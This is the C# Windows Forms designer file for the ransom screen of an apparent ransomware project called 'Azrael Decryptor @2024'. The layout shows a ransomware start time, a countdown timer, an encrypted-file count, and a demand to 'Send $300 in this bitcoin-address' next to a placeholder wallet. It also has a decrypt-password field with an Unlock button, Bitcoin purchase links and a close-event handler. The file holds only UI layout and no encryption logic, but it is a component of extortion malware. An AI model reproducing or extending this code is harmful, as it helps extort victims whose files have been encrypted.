namespace FuxForm
{
    partial class Form1
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.label10 = new System.Windows.Forms.Label();
            this.SecondomersLabel = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.RansStartTime = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.panel2 = new System.Windows.Forms.Panel();
            this.ContactLabel = new System.Windows.Forms.Label();
            this.HowBuy_Bitcoin = new System.Windows.Forms.Label();
            this.AboutBitcoin = new System.Windows.Forms.Label();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.panel3 = new System.Windows.Forms.Panel();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.Unlock = new System.Windows.Forms.Button();
            this.UserPassword = new System.Windows.Forms.TextBox();
            this.CopyToClipboard = new System.Windows.Forms.Button();
            this.BitcoinAddress = new System.Windows.Forms.TextBox();
            this.MachineID = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.panel2.SuspendLayout();
            this.panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel1.Controls.Add(this.pictureBox2);
            this.panel1.Controls.Add(this.label10);
            this.panel1.Controls.Add(this.SecondomersLabel);
            this.panel1.Controls.Add(this.label8);
            this.panel1.Controls.Add(this.RansStartTime);
            this.panel1.Controls.Add(this.label6);
            this.panel1.ForeColor = System.Drawing.Color.White;
            this.panel1.Location = new System.Drawing.Point(12, 174);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(212, 157);
            this.panel1.TabIndex = 1;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = global::FuxForm.Properties.Resources.Captura;
            this.pictureBox2.Location = new System.Drawing.Point(177, -1);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(30, 137);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 4;
            this.pictureBox2.TabStop = false;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.Transparent;
            this.label10.Font = new System.Drawing.Font("Consolas", 9.25F, System.Drawing.FontStyle.Bold);
            this.label10.ForeColor = System.Drawing.Color.White;
            this.label10.Location = new System.Drawing.Point(1, 138);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(119, 15);
            this.label10.TabIndex = 10;
            this.label10.Text = "Encrypted Count:";
            // 
            // SecondomersLabel
            // 
            this.SecondomersLabel.AutoSize = true;
            this.SecondomersLabel.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.SecondomersLabel.ForeColor = System.Drawing.Color.White;
            this.SecondomersLabel.Location = new System.Drawing.Point(48, 76);
            this.SecondomersLabel.Name = "SecondomersLabel";
            this.SecondomersLabel.Size = new System.Drawing.Size(106, 24);
            this.SecondomersLabel.TabIndex = 9;
            this.SecondomersLabel.Text = "00:00:00";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(60, 58);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(80, 18);
            this.label8.TabIndex = 8;
            this.label8.Text = "Time-Left";
            // 
            // RansStartTime
            // 
            this.RansStartTime.AutoSize = true;
            this.RansStartTime.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.RansStartTime.ForeColor = System.Drawing.Color.White;
            this.RansStartTime.Location = new System.Drawing.Point(17, 27);
            this.RansStartTime.Name = "RansStartTime";
            this.RansStartTime.Size = new System.Drawing.Size(160, 18);
            this.RansStartTime.TabIndex = 7;
            this.RansStartTime.Text = "dd/mm/yyyy 00:00:00";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(3, 9);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(176, 18);
            this.label6.TabIndex = 6;
            this.label6.Text = "Ransomware Start-Time";
            // 
            // panel2
            // 
            this.panel2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel2.Controls.Add(this.ContactLabel);
            this.panel2.Controls.Add(this.HowBuy_Bitcoin);
            this.panel2.Controls.Add(this.AboutBitcoin);
            this.panel2.Location = new System.Drawing.Point(12, 337);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(212, 131);
            this.panel2.TabIndex = 2;
            // 
            // ContactLabel
            // 
            this.ContactLabel.AutoSize = true;
            this.ContactLabel.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ContactLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.ContactLabel.ForeColor = System.Drawing.Color.Cyan;
            this.ContactLabel.Location = new System.Drawing.Point(56, 88);
            this.ContactLabel.Name = "ContactLabel";
            this.ContactLabel.Size = new System.Drawing.Size(92, 20);
            this.ContactLabel.TabIndex = 2;
            this.ContactLabel.Text = "Contact US";
            this.ContactLabel.Click += new System.EventHandler(this.ContactLabel_Click);
            // 
            // HowBuy_Bitcoin
            // 
            this.HowBuy_Bitcoin.AutoSize = true;
            this.HowBuy_Bitcoin.Cursor = System.Windows.Forms.Cursors.Hand;
            this.HowBuy_Bitcoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.HowBuy_Bitcoin.ForeColor = System.Drawing.Color.Cyan;
            this.HowBuy_Bitcoin.Location = new System.Drawing.Point(34, 54);
            this.HowBuy_Bitcoin.Name = "HowBuy_Bitcoin";
            this.HowBuy_Bitcoin.Size = new System.Drawing.Size(140, 20);
            this.HowBuy_Bitcoin.TabIndex = 1;
            this.HowBuy_Bitcoin.Text = "How to buy Bitcoin";
            this.HowBuy_Bitcoin.Click += new System.EventHandler(this.HowBuy_Bitcoin_Click);
            // 
            // AboutBitcoin
            // 
            this.AboutBitcoin.AutoSize = true;
            this.AboutBitcoin.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AboutBitcoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.AboutBitcoin.ForeColor = System.Drawing.Color.Cyan;
            this.AboutBitcoin.Location = new System.Drawing.Point(50, 18);
            this.AboutBitcoin.Name = "AboutBitcoin";
            this.AboutBitcoin.Size = new System.Drawing.Size(104, 20);
            this.AboutBitcoin.TabIndex = 0;
            this.AboutBitcoin.Text = "About Bitcoin";
            this.AboutBitcoin.Click += new System.EventHandler(this.AboutBitcoin_Click);
            // 
            // richTextBox1
            // 
            this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox1.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.richTextBox1.Location = new System.Drawing.Point(230, 12);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(421, 329);
            this.richTextBox1.TabIndex = 3;
            this.richTextBox1.Text = resources.GetString("richTextBox1.Text");
            // 
            // panel3
            // 
            this.panel3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel3.Controls.Add(this.label2);
            this.panel3.Controls.Add(this.label1);
            this.panel3.Controls.Add(this.Unlock);
            this.panel3.Controls.Add(this.UserPassword);
            this.panel3.Controls.Add(this.CopyToClipboard);
            this.panel3.Controls.Add(this.BitcoinAddress);
            this.panel3.Location = new System.Drawing.Point(230, 347);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(421, 121);
            this.panel3.TabIndex = 3;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(106, 63);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(184, 18);
            this.label2.TabIndex = 5;
            this.label2.Text = "Write-Decrypt Password";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(69, 8);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(272, 18);
            this.label1.TabIndex = 4;
            this.label1.Text = "Send $300 in this bitcoin-address";
            // 
            // Unlock
            // 
            this.Unlock.BackColor = System.Drawing.Color.White;
            this.Unlock.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Unlock.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Unlock.Location = new System.Drawing.Point(361, 88);
            this.Unlock.Name = "Unlock";
            this.Unlock.Size = new System.Drawing.Size(60, 26);
            this.Unlock.TabIndex = 3;
            this.Unlock.Text = "Unlock";
            this.Unlock.UseVisualStyleBackColor = false;
            this.Unlock.Click += new System.EventHandler(this.Unlock_Click);
            // 
            // UserPassword
            // 
            this.UserPassword.BackColor = System.Drawing.Color.Black;
            this.UserPassword.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold);
            this.UserPassword.ForeColor = System.Drawing.Color.White;
            this.UserPassword.Location = new System.Drawing.Point(3, 88);
            this.UserPassword.Multiline = true;
            this.UserPassword.Name = "UserPassword";
            this.UserPassword.Size = new System.Drawing.Size(353, 26);
            this.UserPassword.TabIndex = 2;
            this.UserPassword.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // CopyToClipboard
            // 
            this.CopyToClipboard.BackColor = System.Drawing.Color.White;
            this.CopyToClipboard.Cursor = System.Windows.Forms.Cursors.Hand;
            this.CopyToClipboard.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CopyToClipboard.Location = new System.Drawing.Point(358, 29);
            this.CopyToClipboard.Name = "CopyToClipboard";
            this.CopyToClipboard.Size = new System.Drawing.Size(60, 26);
            this.CopyToClipboard.TabIndex = 1;
            this.CopyToClipboard.Text = "Copy";
            this.CopyToClipboard.UseVisualStyleBackColor = false;
            this.CopyToClipboard.Click += new System.EventHandler(this.CopyToClipboard_Click);
            // 
            // BitcoinAddress
            // 
            this.BitcoinAddress.BackColor = System.Drawing.Color.Black;
            this.BitcoinAddress.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.BitcoinAddress.ForeColor = System.Drawing.Color.White;
            this.BitcoinAddress.Location = new System.Drawing.Point(3, 29);
            this.BitcoinAddress.Multiline = true;
            this.BitcoinAddress.Name = "BitcoinAddress";
            this.BitcoinAddress.Size = new System.Drawing.Size(353, 26);
            this.BitcoinAddress.TabIndex = 0;
            this.BitcoinAddress.Text = "BITCOIN_ADDRESS_HERE";
            this.BitcoinAddress.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // MachineID
            // 
            this.MachineID.AutoSize = true;
            this.MachineID.BackColor = System.Drawing.Color.Transparent;
            this.MachineID.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.MachineID.ForeColor = System.Drawing.Color.White;
            this.MachineID.Location = new System.Drawing.Point(6, 475);
            this.MachineID.Name = "MachineID";
            this.MachineID.Size = new System.Drawing.Size(24, 13);
            this.MachineID.TabIndex = 4;
            this.MachineID.Text = "ID:";
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::FuxForm.Properties.Resources.fsock;
            this.pictureBox1.Location = new System.Drawing.Point(23, 11);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(175, 156);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(654, 491);
            this.Controls.Add(this.MachineID);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.richTextBox1);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.pictureBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Form1";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Azrael Decryptor @2024";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.Button CopyToClipboard;
        private System.Windows.Forms.TextBox BitcoinAddress;
        private System.Windows.Forms.Label ContactLabel;
        private System.Windows.Forms.Label HowBuy_Bitcoin;
        private System.Windows.Forms.Label AboutBitcoin;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button Unlock;
        private System.Windows.Forms.TextBox UserPassword;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label RansStartTime;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label SecondomersLabel;
        private System.Windows.Forms.PictureBox pictureBox2;
        private System.Windows.Forms.Label MachineID;
        private System.Windows.Forms.Timer timer1;
    }
}

